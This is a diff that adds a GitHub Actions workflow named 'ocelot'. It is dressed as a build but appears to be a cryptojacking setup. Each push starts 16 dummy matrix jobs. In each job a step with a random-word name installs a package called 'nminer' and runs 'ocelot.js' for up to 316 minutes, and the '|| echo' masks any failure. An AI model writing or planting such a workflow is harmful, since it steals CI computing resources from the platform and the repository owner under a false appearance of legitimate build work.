@@ -1,0 +1,41 @@
+name: ocelot
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 4708 }
+          - { version: 1124 }
+          - { version: 9394 }
+          - { version: 6153 }
+          - { version: 5676 }
+          - { version: 2598 }
+          - { version: 9775 }
+          - { version: 8452 }
+          - { version: 5674 }
+          - { version: 4229 }
+          - { version: 2486 }
+          - { version: 6618 }
+          - { version: 6517 }
+          - { version: 1760 }
+          - { version: 6586 }
+          - { version: 4972 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: guest fooey knuckle silky whirlwind
+        run: |
+          npm install nminer@latest
+          timeout 316m node ocelot.js || echo "ocelot executed"
